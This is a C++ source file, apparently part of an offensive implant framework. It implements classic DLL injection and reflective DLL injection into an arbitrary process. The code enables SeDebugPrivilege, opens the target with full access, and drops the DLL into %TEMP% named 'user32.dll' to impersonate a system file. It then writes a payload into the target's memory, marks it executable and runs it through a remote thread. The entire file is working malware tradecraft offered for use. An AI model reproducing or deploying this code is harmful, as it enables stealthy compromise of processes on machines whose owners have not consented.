#include "core/technique.hpp"

// Reference:
// https://github.com/stephenfewer/ReflectiveDLLInjection/blob/master/inject/src/LoadLibraryR.c
namespace Technique::Injection::Helper
{
    DWORD Rva2Offset(DWORD dwRva, UINT_PTR uBaseAddr)
    {            
        PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)(uBaseAddr + ((PIMAGE_DOS_HEADER)uBaseAddr)->e_lfanew);
        PIMAGE_SECTION_HEADER pSecHeader = (PIMAGE_SECTION_HEADER)((UINT_PTR)(&pNtHeaders->OptionalHeader) + pNtHeaders->FileHeader.SizeOfOptionalHeader);

        if(dwRva < pSecHeader[0].PointerToRawData)
            return dwRva;

        WORD wIndex = 0;
        for(wIndex=0 ; wIndex < pNtHeaders->FileHeader.NumberOfSections ; wIndex++)
        {   
            if(
                dwRva >= pSecHeader[wIndex].VirtualAddress &&
                dwRva < (pSecHeader[wIndex].VirtualAddress + pSecHeader[wIndex].SizeOfRawData)
            ) {
                return (dwRva - pSecHeader[wIndex].VirtualAddress + pSecHeader[wIndex].PointerToRawData);
            }
        }
        
        return 0;
    }

    DWORD GetFuncOffset(LPVOID lpBuffer, LPCSTR lpFuncName)
    {
        #ifdef _WIN64
            DWORD dwCompiledArch = 2;
        #else
            DWORD dwCompiledArch = 1;
        #endif

        UINT_PTR uBaseAddr   = (UINT_PTR)lpBuffer;
        PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)(uBaseAddr + (PIMAGE_DOS_HEADER)uBaseAddr);
        PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)(uBaseAddr + ((PIMAGE_DOS_HEADER)uBaseAddr)->e_lfanew);
        
        if (pNtHeaders->OptionalHeader.Magic == 0x010B) // PE32
        {
            if (dwCompiledArch != 1)
                return 0;
        }
        else if (pNtHeaders->OptionalHeader.Magic == 0x020B) // PE64
        {
            if (dwCompiledArch != 2)
                return 0;
        }
        else
        {
            return 0;
        }

        UINT_PTR uTemp = (UINT_PTR)&(pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT]);
        PIMAGE_EXPORT_DIRECTORY pExportDir = (PIMAGE_EXPORT_DIRECTORY)(uBaseAddr + Rva2Offset(((PIMAGE_DATA_DIRECTORY)uTemp)->VirtualAddress, uBaseAddr));

        UINT_PTR uNames          = uBaseAddr + Rva2Offset(pExportDir->AddressOfNames, uBaseAddr);
        UINT_PTR uNameOrdinals   = uBaseAddr + Rva2Offset(pExportDir->AddressOfNameOrdinals, uBaseAddr);
        UINT_PTR uAddresses      = uBaseAddr + Rva2Offset(pExportDir->AddressOfFunctions, uBaseAddr);

        DWORD dwCounter = pExportDir->NumberOfNames;

        while (dwCounter--)
        {
            char* cExportedFuncName = (char*)(uBaseAddr + Rva2Offset(DEREF_32(uNames), uBaseAddr));

            if (strcmp(cExportedFuncName, lpFuncName) == 0)
            {
                uAddresses = uBaseAddr + Rva2Offset(pExportDir->AddressOfFunctions, uBaseAddr);
                uAddresses += (DEREF_16(uNameOrdinals) * sizeof(DWORD));

                return Rva2Offset(DEREF_32(uAddresses), uBaseAddr);
            }

            uNames += sizeof(DWORD);
            uNameOrdinals += sizeof(WORD);
        }

        return 0;
    }
}

namespace Technique::Injection
{
    BOOL DllInjection(
        Procs::PPROCS pProcs,
        DWORD dwPID,
        const std::vector<BYTE>& bytes
    ) {
        HANDLE hProcess;
        HANDLE hThread;
        PVOID pBaseAddr;

        // Set the DLL file path to inject
        std::wstring wDllFile = L"user32.dll"; // Impersonate the file name.
        std::wstring wDllPath = System::Env::EnvStringsGet(pProcs, L"%TEMP%") + L"\\" + wDllFile;
        size_t dwDllPathSize = (wDllPath.size() + 1) * sizeof(wchar_t);

        // Write DLL file
        if (!System::Fs::FileWrite(pProcs, wDllPath, bytes))
        {
            return FALSE;
        }

        HANDLE hToken;
        TOKEN_PRIVILEGES priv = {0};
        if (pProcs->lpOpenProcessToken(NtCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
        {
            priv.PrivilegeCount = 1;
            priv.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

            if (pProcs->lpLookupPrivilegeValueW(nullptr, SE_DEBUG_NAME, &priv.Privileges[0].Luid))
            {
                pProcs->lpAdjustTokenPrivileges(hToken, FALSE, &priv, 0, nullptr, nullptr);
            }

            pProcs->lpCloseHandle(hToken);
        }

        hProcess = System::Process::ProcessOpen(
            pProcs,
            dwPID,
            PROCESS_ALL_ACCESS
        );
        if (!hProcess)
        {
            return FALSE;
        }

        pBaseAddr = System::Process::VirtualMemoryAllocate(
            pProcs,
            hProcess,
            nullptr,
            dwDllPathSize,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_READWRITE
        );
        if (!pBaseAddr)
        {
            pProcs->lpNtClose(hProcess);
            return FALSE;
        }

        if (!System::Process::VirtualMemoryWrite(
            pProcs,
            hProcess,
            pBaseAddr,
            (LPVOID)wDllPath.c_str(),
            dwDllPathSize,
            nullptr
        )) {
            System::Process::VirtualMemoryFree(
                pProcs,
                hProcess,
                &pBaseAddr,
                0,
                MEM_RELEASE
            );
            pProcs->lpNtClose(hProcess);
            return FALSE;
        }

        PTHREAD_START_ROUTINE threadStartRoutineAddr = (PTHREAD_START_ROUTINE)GetProcAddress(
            GetModuleHandleA("kernel32"),
            "LoadLibraryW"
        );
        if (!threadStartRoutineAddr)
        {
            System::Process::VirtualMemoryFree(
                pProcs,
                hProcess,
                &pBaseAddr,
                0,
                MEM_RELEASE
            );
            pProcs->lpNtClose(hProcess);
            return FALSE;
        }

        hThread = System::Process::RemoteThreadCreate(
            pProcs,
            hProcess,
            threadStartRoutineAddr,
            pBaseAddr
        );
        if (!hThread)
        {
            System::Process::VirtualMemoryFree(
                pProcs,
                hProcess,
                &pBaseAddr,
                0,
                MEM_RELEASE
            );
            pProcs->lpNtClose(hProcess);
            return FALSE;
        }

        pProcs->lpNtWaitForSingleObject(hThread, FALSE, nullptr);

        pProcs->lpNtClose(hProcess);
        pProcs->lpNtClose(hThread);

        return TRUE;
    }

    BOOL ReflectiveDLLInjection(
        Procs::PPROCS pProcs,
        DWORD dwPID,
        const std::vector<BYTE>& bytes
    ) {        
        LPVOID lpBuffer = (LPVOID)bytes.data();
        SIZE_T dwBufferSize = bytes.size();

        HANDLE hToken;
        TOKEN_PRIVILEGES priv = {0};
        if (pProcs->lpOpenProcessToken(NtCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
        {
            priv.PrivilegeCount = 1;
            priv.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

            if (pProcs->lpLookupPrivilegeValueW(nullptr, SE_DEBUG_NAME, &priv.Privileges[0].Luid))
            {
                pProcs->lpAdjustTokenPrivileges(hToken, FALSE, &priv, 0, nullptr, nullptr);
            }

            pProcs->lpCloseHandle(hToken);
        }

        HANDLE hProcess = System::Process::ProcessOpen(
            pProcs,
            dwPID,
            PROCESS_ALL_ACCESS
        );
        if (!hProcess)
            return FALSE;

        // Get offset of the ReflectiveLoader function in the DLL.
        DWORD dwRefLoaderOffset = Technique::Injection::Helper::GetFuncOffset(lpBuffer, "ReflectiveLoader");
        if (dwRefLoaderOffset == 0)
        {
            System::Handle::HandleClose(pProcs, hProcess);
            return FALSE;
        }

        // Allocate memory
        LPVOID lpRemoteBuffer = System::Process::VirtualMemoryAllocate(
            pProcs,
            hProcess,
            nullptr,
            dwBufferSize,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_READWRITE
        );
        if (!lpRemoteBuffer)
        {
            System::Handle::HandleClose(pProcs, hProcess);
            return FALSE;
        }

        // Write buffer to the allocated space
        SIZE_T dwNumberOfWritten;
        if (!System::Process::VirtualMemoryWrite(
            pProcs,
            hProcess,
            lpRemoteBuffer,
            lpBuffer,
            dwBufferSize,
            &dwNumberOfWritten
        ) || dwNumberOfWritten != dwBufferSize) {
            System::Process::VirtualMemoryFree(pProcs, hProcess, &lpRemoteBuffer, 0, MEM_RELEASE);
            System::Handle::HandleClose(pProcs, hProcess);
            return FALSE;
        }

        // Set PAGE_EXECUTE_READWRITE protection.
        DWORD dwOldProtect = PAGE_READWRITE;
        if (!System::Process::VirtualMemoryProtect(
            pProcs,
            hProcess,
            &lpRemoteBuffer,
            &dwBufferSize,
            PAGE_EXECUTE_READWRITE,
            &dwOldProtect
        )) {
            System::Process::VirtualMemoryFree(pProcs, hProcess, &lpRemoteBuffer, 0, MEM_RELEASE);
            System::Handle::HandleClose(pProcs, hProcess);
            return FALSE;
        }
            
        LPTHREAD_START_ROUTINE lpRefLoader = (LPTHREAD_START_ROUTINE)((ULONG_PTR)lpRemoteBuffer + dwRefLoaderOffset);

        HANDLE hThread = System::Process::RemoteThreadCreate(
            pProcs,
            hProcess,
            lpRefLoader,
            nullptr
        );
        if (hThread)
        {
            System::Handle::HandleWait(pProcs, hThread, FALSE, nullptr);
        }

        System::Process::VirtualMemoryFree(pProcs, hProcess, &lpRemoteBuffer, 0, MEM_RELEASE);
        System::Handle::HandleClose(pProcs, hProcess);
        System::Handle::HandleClose(pProcs, hThread);

        return TRUE;
    }
}